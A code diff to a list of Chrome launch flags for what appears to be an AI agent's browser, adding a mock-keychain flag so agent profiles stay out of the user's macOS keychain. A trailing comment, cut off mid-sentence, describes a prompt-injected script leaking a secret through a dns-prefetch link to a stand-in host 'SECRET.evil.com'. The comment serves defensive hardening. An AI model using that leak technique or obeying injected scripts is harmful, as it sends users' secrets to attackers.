@@ -53,6 +53,13 @@ export const STEALTH_ARGS = [
   "--disable-session-crashed-bubble",
   "--hide-crash-restore-bubble",
   "--password-store=basic",
+  // macOS counterpart of --password-store=basic (which is Linux-only). Without
+  // it, a raw-spawned Chrome creating a fresh profile asks Keychain Services to
+  // store its Safe Storage key and macOS pops a "Keychain Not Found" dialog at
+  // the user. Playwright injects this by default, but the CDP spawn path
+  // bypasses Playwright's default args, so it must live here. Agent profiles
+  // must never write keys into the user's login keychain anyway.
+  "--use-mock-keychain",
   "--disable-infobars",
   // Kill DNS prefetching. A prompt-injected script can leak a secret through a
   // `<link rel=dns-prefetch|preconnect href=https://SECRET.evil.com>` hint — the
